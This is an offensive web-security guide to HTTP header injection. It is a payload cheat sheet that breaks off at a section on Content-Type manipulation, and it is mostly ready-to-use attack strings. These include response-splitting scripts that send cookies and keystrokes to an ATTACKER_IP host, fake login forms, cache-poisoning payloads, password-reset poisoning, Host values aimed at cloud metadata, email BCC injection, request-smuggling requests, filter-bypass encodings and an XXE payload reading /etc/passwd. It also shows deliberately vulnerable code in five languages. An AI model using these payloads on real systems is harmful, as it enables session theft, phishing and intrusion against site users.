---
title: HTTP Header Injection
description: Complete guide to HTTP Header Injection — CRLF injection, Host header attacks, response splitting, cache poisoning, session fixation, request smuggling, payloads, privilege escalation, and defense for penetration testers and security researchers.
navigation:
  icon: i-lucide-arrow-down-to-line
  title: Header Injection
---

## What is HTTP Header Injection?

HTTP Header Injection is a class of web application vulnerabilities that occurs when an attacker can **inject arbitrary HTTP headers** or **modify existing headers** by inserting special characters (primarily **Carriage Return `\r` and Line Feed `\n`**) into HTTP requests or responses. This vulnerability exploits the fundamental structure of the HTTP protocol, where headers are separated by CRLF sequences (`\r\n`) and the header section is separated from the body by a double CRLF (`\r\n\r\n`).

::callout{icon="i-lucide-info" color="blue"}
HTTP headers are the backbone of client-server communication. They control caching, authentication, content type, redirects, cookies, security policies, and more. Injecting or manipulating headers gives an attacker significant control over the application's behavior.
::

### HTTP Protocol Structure

Understanding HTTP message structure is essential for exploiting header injection.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="HTTP Request Structure"}
  ```http [HTTP Request]
  GET /search?q=test HTTP/1.1\r\n
  Host: target.com\r\n
  User-Agent: Mozilla/5.0\r\n
  Accept: text/html\r\n
  Cookie: session=abc123\r\n
  \r\n
  [Request Body - if POST]
  ```

  Every line ends with `\r\n` (CRLF). The blank line (`\r\n\r\n`) marks the end of headers and beginning of the body.
  :::

  :::tabs-item{icon="i-lucide-eye" label="HTTP Response Structure"}
  ```http [HTTP Response]
  HTTP/1.1 200 OK\r\n
  Content-Type: text/html\r\n
  Set-Cookie: session=xyz789\r\n
  X-Frame-Options: DENY\r\n
  \r\n
  <html>
  <body>Hello World</body>
  </html>
  ```

  The response follows the same CRLF structure. Injecting into response headers allows complete control of the response.
  :::

  :::tabs-item{icon="i-lucide-code" label="CRLF Characters"}
  | Character | Name | ASCII | URL Encoded | Hex |
  |-----------|------|-------|-------------|-----|
  | `\r` | Carriage Return | 13 | `%0d` | `0x0D` |
  | `\n` | Line Feed | 10 | `%0a` | `0x0A` |
  | `\r\n` | CRLF (Header Separator) | 13, 10 | `%0d%0a` | `0x0D0A` |
  | `\r\n\r\n` | Double CRLF (Header-Body Separator) | 13, 10, 13, 10 | `%0d%0a%0d%0a` | — |
  :::
::

---

## Attack Categories

Header injection encompasses multiple distinct attack types, each with different injection points, mechanisms, and impacts.

::card-group
  ::card
  ---
  title: CRLF Injection
  icon: i-lucide-split
  ---
  Inject Carriage Return Line Feed characters to **insert new headers** or **split the HTTP response** into attacker-controlled content.
  ::

  ::card
  ---
  title: Host Header Injection
  icon: i-lucide-server
  ---
  Manipulate the `Host` header to exploit **password reset poisoning**, **cache poisoning**, **SSRF**, and **virtual host routing** vulnerabilities.
  ::

  ::card
  ---
  title: HTTP Response Splitting
  icon: i-lucide-scissors
  ---
  Inject a complete second HTTP response into the response stream, enabling **XSS**, **cache poisoning**, and **page defacement**.
  ::

  ::card
  ---
  title: Cache Poisoning
  icon: i-lucide-database
  ---
  Inject headers that cause **proxy/CDN caches** to store malicious content and serve it to other users.
  ::

  ::card
  ---
  title: Session Fixation
  icon: i-lucide-cookie
  ---
  Inject `Set-Cookie` headers to **force a known session ID** on the victim, enabling account takeover.
  ::

  ::card
  ---
  title: Request Smuggling
  icon: i-lucide-package
  ---
  Exploit discrepancies in how **front-end and back-end servers** parse `Content-Length` and `Transfer-Encoding` headers to smuggle malicious requests.
  ::

  ::card
  ---
  title: Email Header Injection
  icon: i-lucide-mail
  ---
  Inject CRLF into email headers through web forms to add **CC/BCC recipients**, modify subjects, or inject arbitrary email content for **spam relay**.
  ::

  ::card
  ---
  title: Security Header Bypass
  icon: i-lucide-shield-off
  ---
  Inject or override security headers (`X-Frame-Options`, `Content-Security-Policy`, `X-XSS-Protection`) to **disable browser protections**.
  ::
::

---

## CRLF Injection

CRLF injection is the foundational technique for all header injection attacks. It works by injecting `\r\n` (`%0d%0a`) characters into input that is reflected in HTTP response headers.

### How CRLF Injection Works

::steps{level="4"}

#### Application Reflects Input in Headers

The application takes user input and places it in an HTTP response header without sanitization. Common locations include redirect URLs, cookie values, custom headers, and log entries.

```http [Vulnerable Redirect]
HTTP/1.1 302 Found
Location: /page?lang=USER_INPUT
```

#### Attacker Injects CRLF + New Header

The attacker submits input containing `%0d%0a` followed by a new header:

```text
en%0d%0aInjected-Header:%20malicious-value
```

#### Server Generates Modified Response

The server constructs the response with the injected CRLF, creating a new header line:

```http [Injected Response]
HTTP/1.1 302 Found
Location: /page?lang=en
Injected-Header: malicious-value
```

#### Impact Realized

The injected header is processed by the browser or intermediary proxy, enabling XSS, cookie injection, cache poisoning, or security header bypass.

::

### Vulnerable Code Patterns

::tabs
  :::tabs-item{icon="i-lucide-code" label="PHP (Vulnerable)"}
  ```php [redirect.php]
  <?php
  // VULNERABLE — User input directly in header
  $lang = $_GET['lang'];
  header("Location: /page?lang=" . $lang);
  
  // VULNERABLE — User input in Set-Cookie
  $theme = $_GET['theme'];
  header("Set-Cookie: theme=" . $theme);
  
  // VULNERABLE — User input in custom header
  $ref = $_GET['ref'];
  header("X-Referral: " . $ref);
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python Flask (Vulnerable)"}
  ```python [app.py]
  from flask import Flask, request, redirect, make_response

  app = Flask(__name__)

  @app.route("/redirect")
  def vulnerable_redirect():
      # VULNERABLE — User input in Location header
      url = request.args.get("url", "/")
      response = make_response("", 302)
      response.headers["Location"] = url
      return response

  @app.route("/setlang")
  def vulnerable_cookie():
      # VULNERABLE — User input in Set-Cookie header
      lang = request.args.get("lang", "en")
      response = make_response("OK")
      response.headers["Set-Cookie"] = f"lang={lang}"
      return response
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js Express (Vulnerable)"}
  ```javascript [server.js]
  const express = require('express');
  const app = express();

  // VULNERABLE — User input in response header
  app.get('/api/track', (req, res) => {
    const campaign = req.query.campaign;
    res.setHeader('X-Campaign', campaign);
    res.send('Tracked');
  });

  // VULNERABLE — User input in redirect
  app.get('/redirect', (req, res) => {
    const target = req.query.url;
    res.writeHead(302, { 'Location': target });
    res.end();
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java (Vulnerable)"}
  ```java [RedirectServlet.java]
  import javax.servlet.http.*;

  public class RedirectServlet extends HttpServlet {
      protected void doGet(HttpServletRequest request, HttpServletResponse response) {
          // VULNERABLE — User input in header
          String returnUrl = request.getParameter("returnUrl");
          response.setHeader("Location", returnUrl);
          response.setStatus(302);
          
          // VULNERABLE — User input in cookie
          String pref = request.getParameter("pref");
          response.setHeader("Set-Cookie", "pref=" + pref);
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label=".NET (Vulnerable)"}
  ```csharp [HomeController.cs]
  using Microsoft.AspNetCore.Mvc;

  public class HomeController : Controller
  {
      // VULNERABLE — User input in redirect
      [HttpGet("redirect")]
      public IActionResult Redirect(string url)
      {
          Response.Headers.Add("Location", url);
          return StatusCode(302);
      }

      // VULNERABLE — User input in custom header
      [HttpGet("track")]
      public IActionResult Track(string source)
      {
          Response.Headers.Add("X-Source", source);
          return Ok("Tracked");
      }
  }
  ```
  :::
::

---

## Detection & Identification

::card-group
  ::card
  ---
  title: Header Reflection Discovery
  icon: i-lucide-search
  ---
  Identify parameters whose values appear in HTTP **response headers**. Check `Location`, `Set-Cookie`, `X-Custom-*`, `Content-Disposition`, and other headers for reflected input.
  ::

  ::card
  ---
  title: CRLF Character Testing
  icon: i-lucide-text-cursor-input
  ---
  Inject `%0d%0a` in every parameter and observe if the response headers change. A new header line appearing confirms CRLF injection.
  ::

  ::card
  ---
  title: Response Body Injection Test
  icon: i-lucide-file-text
  ---
  Inject `%0d%0a%0d%0a` (double CRLF) followed by HTML content. If the HTML renders in the response body, full HTTP response splitting is possible.
  ::

  ::card
  ---
  title: Timing & Behavioral Analysis
  icon: i-lucide-clock
  ---
  Compare response behavior with and without CRLF characters. Changes in response size, headers, status code, or rendering indicate vulnerability.
  ::

  ::card
  ---
  title: Proxy/Cache Analysis
  icon: i-lucide-layers
  ---
  Check for caching proxies (Varnish, CloudFlare, Nginx, CDNs) in response headers. These multiply the impact of header injection through cache poisoning.
  ::

  ::card
  ---
  title: Host Header Variance
  icon: i-lucide-globe
  ---
  Send requests with modified `Host`, `X-Forwarded-Host`, and `X-Forwarded-For` headers. Different responses indicate Host header processing that may be injectable.
  ::
::

### Detection Payloads

::code-group
```text [Basic CRLF Test]
%0d%0aInjected-Header:true
```

```text [Double CRLF — Body Injection Test]
%0d%0a%0d%0a<h1>Injected</h1>
```

```text [Set-Cookie Injection Test]
%0d%0aSet-Cookie:%20test=injected
```

```text [LF Only Test]
%0aInjected-Header:true
```

```text [CR Only Test]
%0dInjected-Header:true
```

```text [Null Byte + CRLF]
%00%0d%0aInjected:true
```

```text [Host Header Test]
Host: evil.com
```

```text [X-Forwarded-Host Test]
X-Forwarded-Host: evil.com
```
::

::tip
Use Burp Suite's response comparison feature to quickly identify differences when CRLF characters are injected. Even subtle changes in response headers confirm the vulnerability.
::

---

## Payloads

::note
All payloads are organized by attack technique. Each section contains progressively advanced payloads. Replace `ATTACKER_DOMAIN`, `ATTACKER_IP`, and `TARGET` with actual values.
::

### CRLF Injection Payloads

::collapsible
---
label: "Basic CRLF — Header Injection"
---

```text [Inject Custom Header]
%0d%0aX-Injected:true
```

```text [Inject Multiple Headers]
%0d%0aX-Injected:header1%0d%0aX-Another:header2
```

```text [Inject Content-Type Header]
%0d%0aContent-Type:%20text/html
```

```text [Inject Content-Length Header]
%0d%0aContent-Length:%200
```

```text [Inject Connection Header]
%0d%0aConnection:%20close
```

```text [Inject Transfer-Encoding Header]
%0d%0aTransfer-Encoding:%20chunked
```

```text [Inject Access-Control-Allow-Origin]
%0d%0aAccess-Control-Allow-Origin:%20*
```

```text [Inject Access-Control-Allow-Credentials]
%0d%0aAccess-Control-Allow-Origin:%20https://evil.com%0d%0aAccess-Control-Allow-Credentials:%20true
```

```text [Inject X-Forwarded-For]
%0d%0aX-Forwarded-For:%20127.0.0.1
```

```text [Inject Via Header]
%0d%0aVia:%201.1%20evil-proxy
```

```text [Inject Warning Header]
%0d%0aWarning:%20199%20Miscellaneous%20warning
```
::

::collapsible
---
label: "CRLF — Cookie Injection (Set-Cookie)"
---

```text [Basic Set-Cookie Injection]
%0d%0aSet-Cookie:%20session=attacker_session_id
```

```text [Set-Cookie with Path]
%0d%0aSet-Cookie:%20session=evil;%20Path=/
```

```text [Set-Cookie with Domain]
%0d%0aSet-Cookie:%20session=evil;%20Domain=.target.com;%20Path=/
```

```text [Set-Cookie with HttpOnly]
%0d%0aSet-Cookie:%20admin=true;%20Path=/;%20HttpOnly
```

```text [Set-Cookie with Secure Flag]
%0d%0aSet-Cookie:%20token=malicious;%20Secure;%20Path=/
```

```text [Set-Cookie with SameSite=None]
%0d%0aSet-Cookie:%20session=evil;%20SameSite=None;%20Secure;%20Path=/
```

```text [Set-Cookie with Expiry (Persistent)]
%0d%0aSet-Cookie:%20backdoor=true;%20Expires=Thu,%2031%20Dec%202030%2023:59:59%20GMT;%20Path=/
```

```text [Multiple Cookie Injection]
%0d%0aSet-Cookie:%20session=evil%0d%0aSet-Cookie:%20role=admin%0d%0aSet-Cookie:%20user=attacker
```

```text [Overwrite Existing Cookie]
%0d%0aSet-Cookie:%20session=;%20Expires=Thu,%2001%20Jan%201970%2000:00:00%20GMT%0d%0aSet-Cookie:%20session=attacker_value;%20Path=/
```

```text [Session Fixation — Force Session ID]
%0d%0aSet-Cookie:%20PHPSESSID=attacker_known_session_id;%20Path=/
```

```text [Session Fixation — JSESSIONID]
%0d%0aSet-Cookie:%20JSESSIONID=attacker_known_session;%20Path=/
```

```text [Session Fixation — ASP.NET]
%0d%0aSet-Cookie:%20ASP.NET_SessionId=attacker_session;%20Path=/
```

```text [Cookie with Subdomain Scope]
%0d%0aSet-Cookie:%20token=evil;%20Domain=.target.com;%20Path=/;%20HttpOnly;%20Secure
```
::

::collapsible
---
label: "CRLF — Security Header Override/Removal"
---

```text [Remove X-Frame-Options (Enable Clickjacking)]
%0d%0aX-Frame-Options:%20ALLOWALL
```

```text [Override Content-Security-Policy]
%0d%0aContent-Security-Policy:%20default-src%20*%20'unsafe-inline'%20'unsafe-eval'
```

```text [Disable XSS Protection]
%0d%0aX-XSS-Protection:%200
```

```text [Remove HSTS]
%0d%0aStrict-Transport-Security:%20max-age=0
```

```text [Override X-Content-Type-Options]
%0d%0aX-Content-Type-Options:%20nosniff-disabled
```

```text [Permissive CORS Headers]
%0d%0aAccess-Control-Allow-Origin:%20*%0d%0aAccess-Control-Allow-Methods:%20GET,%20POST,%20PUT,%20DELETE%0d%0aAccess-Control-Allow-Headers:%20*%0d%0aAccess-Control-Allow-Credentials:%20true
```

```text [Override Referrer-Policy]
%0d%0aReferrer-Policy:%20unsafe-url
```

```text [Override Permissions-Policy]
%0d%0aPermissions-Policy:%20camera=*,%20microphone=*,%20geolocation=*
```

```text [Remove Content-Security-Policy-Report-Only]
%0d%0aContent-Security-Policy-Report-Only:%20default-src%20*
```

```text [Feature-Policy Override]
%0d%0aFeature-Policy:%20camera%20*;%20microphone%20*;%20geolocation%20*
```
::

### HTTP Response Splitting Payloads

HTTP Response Splitting injects a **complete second HTTP response** by terminating the current response and injecting a new one. This is the most dangerous form of CRLF injection.

::caution
HTTP Response Splitting can achieve **full XSS**, **cache poisoning**, and **page defacement**. It works by injecting `\r\n\r\n` to end the headers section, then injecting a complete HTML body followed by a new HTTP response.
::

::collapsible
---
label: "Response Splitting — XSS Payloads"
---

```text [Basic Response Splitting — XSS]
%0d%0a%0d%0a<script>alert('XSS')</script>
```

```text [Response Splitting — HTML Injection]
%0d%0a%0d%0a<h1>Hacked</h1><p>This page has been defaced.</p>
```

```text [Response Splitting — Full HTML Page]
%0d%0a%0d%0a<!DOCTYPE html><html><head><title>Pwned</title></head><body><h1>XSS via Response Splitting</h1><script>alert(document.cookie)</script></body></html>
```

```text [Response Splitting — Cookie Stealer]
%0d%0a%0d%0a<script>document.location='http://ATTACKER_IP/?c='+document.cookie</script>
```

```text [Response Splitting — Session Hijack]
%0d%0a%0d%0a<script>new Image().src='http://ATTACKER_IP/steal?cookie='+encodeURIComponent(document.cookie)</script>
```

```text [Response Splitting — Keylogger Injection]
%0d%0a%0d%0a<script>document.addEventListener('keypress',function(e){new Image().src='http://ATTACKER_IP/log?k='+e.key})</script>
```

```text [Response Splitting — Phishing Form]
%0d%0a%0d%0a<html><body><h2>Session Expired</h2><form action="http://ATTACKER_IP/phish" method="POST"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form></body></html>
```

```text [Response Splitting — Iframe Injection]
%0d%0a%0d%0a<iframe src="http://ATTACKER_IP/evil" width="100%" height="100%" style="border:none;position:fixed;top:0;left:0;z-index:9999"></iframe>
```

```text [Response Splitting — SVG XSS]
%0d%0a%0d%0a<svg/onload=alert('XSS')>
```

```text [Response Splitting — IMG Tag XSS]
%0d%0a%0d%0a<img src=x onerror=alert('XSS')>
```

```text [Response Splitting with Content-Type Control]
%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2050%0d%0a%0d%0a<script>alert(document.domain)</script>
```

```text [Complete Second Response Injection]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<script>alert('Split')</script>
```
::

::collapsible
---
label: "Response Splitting — Cache Poisoning"
---

```text [Cache Poisoning — Inject Cached XSS]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0aContent-Length:%2060%0d%0a%0d%0a<script>alert('Cached XSS for all users')</script>
```

```text [Cache Poisoning — Redirect All Users]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20301%20Moved%0d%0aLocation:%20http://ATTACKER_IP/phishing%0d%0aCache-Control:%20public,%20max-age=604800%0d%0aContent-Length:%200%0d%0a%0d%0a
```

```text [Cache Poisoning — Inject Malicious JS File]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20application/javascript%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0a%0d%0avar exfil=new Image();exfil.src='http://ATTACKER_IP/?d='+document.cookie;
```

```text [Cache Poisoning — Replace CSS]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/css%0d%0aCache-Control:%20public,%20max-age=31536000%0d%0a%0d%0abody{background:url('http://ATTACKER_IP/pixel.gif')}input[type=password]{background:url('http://ATTACKER_IP/pwfield')}
```
::

### Host Header Injection Payloads

The `Host` header tells the server which website the client wants to access. Many applications **trust** the Host header value and use it to generate links, redirect URLs, password reset tokens, and cached content.

::collapsible
---
label: "Password Reset Poisoning"
---

When a user requests a password reset, the application often uses the `Host` header to construct the reset link. By injecting a malicious Host header, the attacker can make the reset link point to their server.

**Attack Flow:**

::steps{level="4"}

#### Attacker intercepts password reset request

The attacker submits a password reset for the **victim's email** but modifies the Host header.

#### Malicious Host header is injected

```http
POST /forgot-password HTTP/1.1
Host: ATTACKER_DOMAIN
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

#### Application generates poisoned reset link

The application constructs: `https://ATTACKER_DOMAIN/reset?token=SECRET_TOKEN`

#### Victim clicks the link

The victim receives the email, clicks the link, and the **reset token** is sent to the attacker's server.

#### Attacker uses the token

The attacker uses `https://target.com/reset?token=SECRET_TOKEN` to reset the victim's password.

::

```http [Basic Host Header Override]
Host: ATTACKER_DOMAIN
```

```http [X-Forwarded-Host Override]
Host: target.com
X-Forwarded-Host: ATTACKER_DOMAIN
```

```http [X-Host Override]
Host: target.com
X-Host: ATTACKER_DOMAIN
```

```http [X-Forwarded-Server Override]
Host: target.com
X-Forwarded-Server: ATTACKER_DOMAIN
```

```http [X-Original-URL Override]
Host: target.com
X-Original-URL: http://ATTACKER_DOMAIN
```

```http [X-Rewrite-URL Override]
Host: target.com
X-Rewrite-URL: http://ATTACKER_DOMAIN
```

```http [Forwarded Header (RFC 7239)]
Host: target.com
Forwarded: host=ATTACKER_DOMAIN
```

```http [Duplicate Host Header]
Host: target.com
Host: ATTACKER_DOMAIN
```

```http [Host with Port]
Host: ATTACKER_DOMAIN:443
```

```http [Host Header with @ Symbol]
Host: target.com@ATTACKER_DOMAIN
```

```http [Host with Absolute URL]
GET https://ATTACKER_DOMAIN/ HTTP/1.1
Host: target.com
```

```http [Subdomain Injection]
Host: ATTACKER_DOMAIN.target.com
```

```http [Host with Space]
Host: target.com ATTACKER_DOMAIN
```

```http [Tab Separated Host]
Host: target.com	ATTACKER_DOMAIN
```

```http [Host Header Line Wrapping]
Host: target.com
 ATTACKER_DOMAIN
```
::

::collapsible
---
label: "Host Header — Web Cache Poisoning"
---

```http [Cache Poisoning via Host Header]
GET /static/main.js HTTP/1.1
Host: ATTACKER_DOMAIN
X-Forwarded-Host: ATTACKER_DOMAIN
```

```http [Cache Poisoning — Static Asset]
GET /style.css HTTP/1.1
Host: ATTACKER_DOMAIN
```

```http [Cache Poisoning with Cache Buster]
GET /?cb=unique_value HTTP/1.1
Host: ATTACKER_DOMAIN
```

```http [Cache Poisoning — X-Forwarded-Scheme]
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
X-Forwarded-Host: ATTACKER_DOMAIN
```

```http [Cache Poisoning — X-Forwarded-Proto]
GET / HTTP/1.1
Host: target.com
X-Forwarded-Proto: http
```

```http [Cache Poisoning — Via Multiple Headers]
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: ATTACKER_DOMAIN
X-Forwarded-Port: 443
X-Forwarded-Proto: https
```
::

::collapsible
---
label: "Host Header — SSRF / Internal Access"
---

```http [Access Internal Services]
Host: 127.0.0.1
```

```http [Access Localhost]
Host: localhost
```

```http [Internal IP Ranges]
Host: 192.168.1.1
```

```http [Internal Hostname]
Host: internal-admin.target.local
```

```http [Cloud Metadata — AWS]
Host: 169.254.169.254
```

```http [Cloud Metadata — GCP]
Host: metadata.google.internal
```

```http [Cloud Metadata — Azure]
Host: 169.254.169.254
Metadata: true
```

```http [Admin Panel via Virtual Host]
Host: admin.target.com
```

```http [Staging Environment]
Host: staging.target.com
```

```http [Development Environment]
Host: dev.target.com
```

```http [Internal API]
Host: api-internal.target.com
```

```http [Kubernetes Service]
Host: service-name.namespace.svc.cluster.local
```

```http [Docker Internal]
Host: host.docker.internal
```
::

::collapsible
---
label: "Host Header — Authentication Bypass"
---

```http [Bypass IP-Based Access Control]
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

```http [Access Restricted Virtual Host]
GET /admin HTTP/1.1
Host: localhost
```

```http [Override Origin Check]
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 10.0.0.1
True-Client-IP: 10.0.0.1
```

```http [Bypass WAF via Host]
GET /admin HTTP/1.1
Host: 127.0.0.1
X-Forwarded-Host: target.com
```
::

### Email Header Injection Payloads

Web applications that send emails using form input (contact forms, feedback, registration) are vulnerable to email header injection via CRLF.

::collapsible
---
label: "Email Header Injection Payloads"
---

```text [Add BCC Recipient]
victim@target.com%0d%0aBcc:%20attacker@evil.com
```

```text [Add CC Recipient]
victim@target.com%0d%0aCc:%20attacker@evil.com
```

```text [Add Multiple BCC]
victim@target.com%0d%0aBcc:%20attacker1@evil.com%0d%0aBcc:%20attacker2@evil.com
```

```text [Change Subject]
victim@target.com%0d%0aSubject:%20Password%20Reset%20Required
```

```text [Inject To Header]
victim@target.com%0d%0aTo:%20attacker@evil.com
```

```text [Change From Header]
victim@target.com%0d%0aFrom:%20admin@target.com
```

```text [Inject Reply-To]
victim@target.com%0d%0aReply-To:%20attacker@evil.com
```

```text [Change Content-Type to HTML]
victim@target.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Phishing Content</h1><a href="http://ATTACKER_IP">Click here to verify</a>
```

```text [Full Email Body Injection]
victim@target.com%0d%0aSubject:%20Account%20Verification%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body><p>Dear User,</p><p>Please verify your account: <a href="http://ATTACKER_IP/phish">Click Here</a></p></body></html>
```

```text [MIME Multipart Injection]
victim@target.com%0d%0aContent-Type:%20multipart/mixed;%20boundary=evil%0d%0a%0d%0a--evil%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected Email Content</h1>%0d%0a--evil--
```

```text [Inject X-Mailer Header]
victim@target.com%0d%0aX-Mailer:%20Evil-Mailer-1.0
```

```text [Add Attachment Reference]
victim@target.com%0d%0aContent-Type:%20multipart/mixed;%20boundary=xyz%0d%0aMIME-Version:%201.0%0d%0a%0d%0a--xyz%0d%0aContent-Type:%20text/plain%0d%0a%0d%0aSee attached file%0d%0a--xyz%0d%0aContent-Type:%20application/octet-stream;%20name=malware.exe%0d%0aContent-Transfer-Encoding:%20base64%0d%0a%0d%0aTVqQAAMA...%0d%0a--xyz--
```

```text [LF Only — Email Injection]
victim@target.com%0aBcc:%20attacker@evil.com
```

```text [Null Byte + Email Injection]
victim@target.com%00%0d%0aBcc:%20attacker@evil.com
```
::

### Request Smuggling via Header Injection

::warning
HTTP Request Smuggling exploits disagreements between front-end and back-end servers on how they parse `Content-Length` and `Transfer-Encoding` headers. This is an advanced technique with severe impact.
::

::collapsible
---
label: "CL.TE — Content-Length vs Transfer-Encoding"
---

The front-end uses `Content-Length` and the back-end uses `Transfer-Encoding: chunked`.

```http [CL.TE Basic Smuggling]
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```http [CL.TE — Smuggle GET Request]
POST / HTTP/1.1
Host: target.com
Content-Length: 41
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

```http [CL.TE — Smuggle POST with Body]
POST / HTTP/1.1
Host: target.com
Content-Length: 76
Transfer-Encoding: chunked

0

POST /admin/delete HTTP/1.1
Host: target.com
Content-Length: 10

user=admin
```

```http [CL.TE — Poison Next Request]
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /redirect?url=http://ATTACKER_IP HTTP/1.1
X-Foo: bar
```
::

::collapsible
---
label: "TE.CL — Transfer-Encoding vs Content-Length"
---

The front-end uses `Transfer-Encoding: chunked` and the back-end uses `Content-Length`.

```http [TE.CL Basic Smuggling]
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

```http [TE.CL — Hijack Next Request]
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

71
POST /profile HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=
0


```
::

::collapsible
---
label: "TE.TE — Transfer-Encoding Obfuscation"
---

Both servers support `Transfer-Encoding` but one can be tricked with obfuscated headers.

```http [TE.TE — Extra Space]
Transfer-Encoding : chunked
```

```http [TE.TE — Tab Character]
Transfer-Encoding:	chunked
```

```http [TE.TE — Newline Before Value]
Transfer-Encoding:
 chunked
```

```http [TE.TE — Mixed Case]
Transfer-Encoding: Chunked
```

```http [TE.TE — Duplicate Header]
Transfer-Encoding: chunked
Transfer-Encoding: identity
```

```http [TE.TE — Trailing Characters]
Transfer-Encoding: chunked x
```

```http [TE.TE — CRLF in Value]
Transfer-Encoding: chunked
 
```

```http [TE.TE — Null Byte]
Transfer-Encoding: chunked%00
```

```http [TE.TE — Vertical Tab]
Transfer-Encoding:%0bchunked
```

```http [TE.TE — Non-standard Encoding Name]
Transfer-Encoding: cow
Transfer-Encoding: chunked
```
::

### CRLF Injection Filter Bypass Payloads

::collapsible
---
label: "Encoding & Evasion Techniques"
---

```text [Standard URL Encoding]
%0d%0aInjected:true
```

```text [Double URL Encoding]
%250d%250aInjected:true
```

```text [Triple URL Encoding]
%25250d%25250aInjected:true
```

```text [Unicode Encoding — CR]
%u000dInjected:true
```

```text [Unicode Encoding — LF]
%u000aInjected:true
```

```text [Unicode Encoding — Full CRLF]
%u000d%u000aInjected:true
```

```text [UTF-8 Encoding]
\r\nInjected:true
```

```text [Overlong UTF-8 — CR]
%c0%8d%c0%8aInjected:true
```

```text [LF Only (Some servers accept)]
%0aInjected:true
```

```text [CR Only]
%0dInjected:true
```

```text [Null Byte Before CRLF]
%00%0d%0aInjected:true
```

```text [Null Byte After CRLF]
%0d%0a%00Injected:true
```

```text [Tab + CRLF]
%09%0d%0aInjected:true
```

```text [Space + CRLF]
%20%0d%0aInjected:true
```

```text [Backspace + CRLF]
%08%0d%0aInjected:true
```

```text [Form Feed + CRLF]
%0c%0d%0aInjected:true
```

```text [Vertical Tab + CRLF]
%0b%0d%0aInjected:true
```

```text [Mixed CR/LF Sequences]
%0d%0d%0a%0aInjected:true
```

```text [Multiple CRLFs]
%0d%0a%0d%0aInjected:true
```

```text [HTML Entity — CR]
&#13;&#10;Injected:true
```

```text [HTML Entity Hex — CR]
&#x0d;&#x0a;Injected:true
```

```text [Backslash Escape]
\r\nInjected:true
```

```text [Unicode Full Width]
%ef%bc%8d%ef%bc%8aInjected:true
```

```text [Right-to-Left Override + CRLF]
%e2%80%8f%0d%0aInjected:true
```

```text [Zero-Width Space + CRLF]
%e2%80%8b%0d%0aInjected:true
```

```text [Soft Hyphen + CRLF]
%c2%ad%0d%0aInjected:true
```

```text [Encoded in Path]
/path%0d%0aInjected:true/page
```

```text [Encoded in Fragment]
/page#%0d%0aInjected:true
```

```text [Encoded in Parameter Name]
?param%0d%0aInjected:true=value
```

```text [Encoded in Cookie Value]
Cookie: session=value%0d%0aInjected:true
```

```text [Encoded in User-Agent]
User-Agent: Mozilla%0d%0aInjected:true
```

```text [Encoded in Referer]
Referer: http://site.com/%0d%0aInjected:true
```
::

### Open Redirect via Header Injection

::collapsible
---
label: "Redirect Hijacking Payloads"
---

```text [Location Header Injection — External Redirect]
%0d%0aLocation:%20http://ATTACKER_IP
```

```text [Location Header with HTTPS]
%0d%0aLocation:%20https://ATTACKER_DOMAIN/phishing
```

```text [302 Redirect with Content-Length Reset]
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20302%20Found%0d%0aLocation:%20http://ATTACKER_IP%0d%0aContent-Length:%200%0d%0a%0d%0a
```

```text [Refresh Header Redirect]
%0d%0aRefresh:%200;%20url=http://ATTACKER_IP
```

```text [Meta Refresh via Response Splitting]
%0d%0a%0d%0a<meta http-equiv="refresh" content="0;url=http://ATTACKER_IP">
```

```text [JavaScript Redirect via Response Splitting]
%0d%0a%0d%0a<script>window.location='http://ATTACKER_IP'</script>
```

```text [Data URI Redirect]
%0d%0aLocation:%20data:text/html,<script>alert('XSS')</script>
```

```text [Protocol-relative Redirect]
%0d%0aLocation:%20//ATTACKER_DOMAIN/evil
```
::

### Content Injection via Headers

::collapsible
---
label: "Content-Type Manipulation"
---

```text [Change Content-Type to HTML]
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected HTML</h1>
```

```text [Change Content-Type to JavaScript]
%0d%0aContent-Type:%20application/javascript%0d%0a%0d%0aalert('XSS')
```

```text [Change Content-Type to XML]
%0d%0aContent-Type:%20application/xml%0d%0a%0d%0a<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
```

```text [Change Content-Type to JSON]
